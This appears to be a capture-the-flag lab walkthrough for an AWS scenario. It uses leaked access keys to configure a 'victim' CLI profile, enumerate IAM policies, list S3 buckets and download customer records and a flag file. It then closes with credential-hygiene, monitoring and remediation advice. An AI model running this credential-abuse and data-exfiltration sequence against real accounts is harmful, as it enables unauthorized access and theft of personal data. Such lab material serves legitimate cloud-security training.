# Walkthrough

## Step 1: AWS CLI Configuration

Configure AWS CLI with the leaked credentials from the GitHub repository.

```bash
# Get credentials from Terraform output
cd terraform
terraform output -json leaked_credentials
```

Configure a profile with the credentials:

```bash
aws configure --profile victim
# AWS Access Key ID: <from output>
# AWS Secret Access Key: <from output>
# Default region name: us-east-1
# Default output format: json
```

## Step 2: Identity Verification

Verify who you are with the compromised credentials.

```bash
aws sts get-caller-identity --profile victim
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/gnawlab/gnawlab-s3heist-user-xxxxxxxx"
}
```

**Key Information:**
- `UserId`: Unique ID of the IAM User
- `Account`: AWS Account ID
- `Arn`: Full ARN (Amazon Resource Name) of the user

Note the username `gnawlab-s3heist-user-xxxxxxxx` from the ARN - you'll need it for the next steps.

---

## Step 3: IAM Permission Enumeration

Now systematically enumerate all permissions available to this user.

### 3.1 List User Inline Policies

Check for inline policies directly attached to the user.

```bash
aws iam list-user-policies \
  --user-name gnawlab-s3heist-user-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "PolicyNames": [
        "gnawlab-s3heist-policy-xxxxxxxx"
    ]
}
```

An inline policy `gnawlab-s3heist-policy-xxxxxxxx` was discovered.

### 3.2 Get Inline Policy Details

Retrieve the actual permissions from the discovered inline policy.

```bash
aws iam get-user-policy \
  --user-name gnawlab-s3heist-user-xxxxxxxx \
  --policy-name gnawlab-s3heist-policy-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "UserName": "gnawlab-s3heist-user-xxxxxxxx",
    "PolicyName": "gnawlab-s3heist-policy-xxxxxxxx",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "IdentityVerification",
                "Effect": "Allow",
                "Action": ["sts:GetCallerIdentity"],
                "Resource": "*"
            },
            {
                "Sid": "IAMEnumeration",
                "Effect": "Allow",
                "Action": [
                    "iam:GetUser",
                    "iam:ListUserPolicies",
                    "iam:ListAttachedUserPolicies",
                    "iam:GetUserPolicy",
                    "iam:ListGroupsForUser",
                    "iam:ListGroupPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:GetGroupPolicy"
                ],
                "Resource": [
                    "arn:aws:iam::123456789012:user/gnawlab/gnawlab-s3heist-user-xxxxxxxx",
                    "arn:aws:iam::123456789012:group/*"
                ]
            },
            {
                "Sid": "S3BucketEnumeration",
                "Effect": "Allow",
                "Action": ["s3:ListAllMyBuckets"],
                "Resource": "*"
            },
            {
                "Sid": "S3DataAccess",
                "Effect": "Allow",
                "Action": ["s3:ListBucket", "s3:GetObject"],
                "Resource": [
                    "arn:aws:s3:::gnawlab-s3heist-data-xxxxxxxx",
                    "arn:aws:s3:::gnawlab-s3heist-data-xxxxxxxx/*"
                ]
            }
        ]
    }
}
```

**Permission Analysis:**
| Statement | Permissions | Description |
|-----------|-------------|-------------|
| IdentityVerification | `sts:GetCallerIdentity` | Identity verification |
| IAMEnumeration | `iam:*` related | IAM permission enumeration |
| S3BucketEnumeration | `s3:ListAllMyBuckets` | List all buckets |
| S3DataAccess | `s3:ListBucket`, `s3:GetObject` | Access specific bucket |

**Important**: The S3DataAccess statement reveals access to a specific bucket `gnawlab-s3heist-data-xxxxxxxx`.

### 3.3 List Attached Policies

Check for managed policies attached to the user.

```bash
aws iam list-attached-user-policies \
  --user-name gnawlab-s3heist-user-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "AttachedPolicies": []
}
```

No managed policies attached.

### 3.4 Check Group Membership

Check if the user belongs to any groups.

```bash
aws iam list-groups-for-user \
  --user-name gnawlab-s3heist-user-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "Groups": []
}
```

The user doesn't belong to any groups, so group policy enumeration is not needed.

> **Note**: If groups existed, you would use `list-group-policies`, `list-attached-group-policies`, and `get-group-policy` to enumerate group permissions as well.

---

## Step 4: S3 Bucket Enumeration

Based on the permission enumeration, we confirmed S3 access. Let's explore the buckets.

### 4.1 List All Buckets

```bash
aws s3 ls --profile victim
```

Expected output:
```
2026-05-01 04:29:16 gnawlab-s3heist-data-xxxxxxxx
```

> **Note**: Other buckets may exist in the account, but the target is `gnawlab-s3heist-data-xxxxxxxx` as identified in the policy.

### 4.2 List Bucket Contents

```bash
aws s3 ls s3://gnawlab-s3heist-data-xxxxxxxx/ --recursive --profile victim
```

Expected output:
```
2026-05-01 04:29:21        249 README.txt
2026-05-01 04:29:21         39 confidential/flag.txt
2026-05-01 04:29:21        299 data/customers.csv
2026-05-01 04:29:21        363 internal/memo.txt
```

**Discovered Files:**
| Path | Size | Description |
|------|------|-------------|
| `README.txt` | 249 bytes | Bucket documentation |
| `confidential/flag.txt` | 39 bytes | **FLAG file** |
| `data/customers.csv` | 299 bytes | Customer data |
| `internal/memo.txt` | 363 bytes | Internal memo |

---

## Step 5: Data Exfiltration

Exfiltrate the discovered files.

### 5.1 Read the README

```bash
aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/README.txt - --profile victim
```

Output:
```
Beaver Rides Inc. - Cloud Storage
==================================

This bucket contains company data.
Authorized personnel only.

Directory Structure:
- /data - Customer information
- /internal - Company memos
- /confidential - Restricted access
```

### 5.2 Exfiltrate Customer Data

```bash
aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/data/customers.csv - --profile victim
```

Output:
```csv
id,name,email,ssn,credit_card
1,John Doe,john.doe@example.com,123-45-6789,4111-1111-1111-1111
2,Jane Smith,jane.smith@example.com,987-65-4321,5500-0000-0000-0004
3,Bob Wilson,bob.wilson@example.com,456-78-9012,3400-0000-0000-009
4,Alice Brown,alice.brown@example.com,321-54-9876,6011-0000-0000-0004
```

**Sensitive Data Found**: SSN, credit card numbers, and other PII exposed.

### 5.3 Read Internal Memo

```bash
aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/internal/memo.txt - --profile victim
```

Output:
```
INTERNAL MEMO - Beaver Rides Inc.
Date: 2024-01-15
Subject: Q4 Security Audit Results

Team,

Our recent security audit identified several areas for improvement:

1. Credential rotation policy needs enforcement
2. S3 bucket access logging should be enabled
3. IAM policies require least-privilege review

Please address these items by end of Q1.

- Security Team
```

**Irony**: The security issues flagged in this audit are exactly what enabled this attack.

---

## Step 6: Flag Extraction

Finally, retrieve the flag from the confidential directory.

```bash
aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/confidential/flag.txt - --profile victim
```

Output:
```
FLAG{s3_bucket_enum_and_exfil_complete}
```

---

## Attack Chain Summary

```
1. Leaked Credentials (GitHub repository)
   ↓ Configure AWS CLI profile
2. sts:GetCallerIdentity
   ↓ Confirm identity, extract username
3. iam:ListUserPolicies
   ↓ Discover inline policy name
4. iam:GetUserPolicy
   ↓ Analyze policy - find S3 access permissions
5. iam:ListAttachedUserPolicies
   ↓ Confirm no managed policies attached
6. iam:ListGroupsForUser
   ↓ Confirm no group membership
7. s3:ListAllMyBuckets
   ↓ Discover target bucket
8. s3:ListBucket
   ↓ Enumerate bucket contents
9. s3:GetObject
   ↓
10. FLAG{s3_bucket_enum_and_exfil_complete}
```

---

## Key Techniques

### IAM User Permission Enumeration

```bash
# Full enumeration sequence for IAM Users
aws sts get-caller-identity
aws iam list-user-policies --user-name <username>
aws iam get-user-policy --user-name <username> --policy-name <policy>
aws iam list-attached-user-policies --user-name <username>
aws iam list-groups-for-user --user-name <username>

# If groups exist, also enumerate:
aws iam list-group-policies --group-name <group>
aws iam get-group-policy --group-name <group> --policy-name <policy>
aws iam list-attached-group-policies --group-name <group>
```

### IAM User vs IAM Role Enumeration

| | IAM User | IAM Role |
|---|---|---|
| Identity Check | `sts:GetCallerIdentity` | `sts:GetCallerIdentity` |
| Inline Policies | `iam:ListUserPolicies` | `iam:ListRolePolicies` |
| Policy Details | `iam:GetUserPolicy` | `iam:GetRolePolicy` |
| Managed Policies | `iam:ListAttachedUserPolicies` | `iam:ListAttachedRolePolicies` |
| Group Membership | `iam:ListGroupsForUser` | N/A |

---

## Lessons Learned

### 1. Credential Hygiene
- Never hardcode credentials in source code
- Use environment variables or secrets management
- Implement pre-commit hooks to detect secrets
- Rotate credentials regularly

### 2. Least Privilege Principle
- IAM policies should grant minimum necessary permissions
- Avoid wildcard (`*`) in Resource fields
- Use resource-level restrictions where possible
- Regular access reviews and cleanup

### 3. S3 Security
- Enable bucket logging for audit trails
- Use bucket policies to restrict access by IP/VPC
- Enable versioning for data recovery
- Consider S3 Object Lock for compliance

### 4. Detection and Monitoring
- Monitor CloudTrail for unusual API patterns
- Alert on rapid IAM enumeration sequences
- Track S3 data access patterns
- Use GuardDuty for anomaly detection

---

## Remediation

### Secure Credential Management

```bash
# Use AWS Secrets Manager or Parameter Store
aws secretsmanager create-secret --name MyAppCredentials --secret-string '{"key":"value"}'

# Or use environment variables (never commit to git)
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
```

### Least Privilege IAM Policy

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::specific-bucket/specific-prefix/*"
    }
  ]
}
```

### Pre-commit Hook for Secret Detection

```bash
# Install git-secrets
brew install git-secrets

# Configure for AWS patterns
git secrets --register-aws
git secrets --install
```

### Additional Security Measures

1. **AWS Config Rules**: Detect overly permissive IAM policies
2. **CloudTrail + CloudWatch Alarms**: Alert on sensitive API calls
3. **GuardDuty**: Enable for credential compromise detection
4. **S3 Access Analyzer**: Identify unintended public access
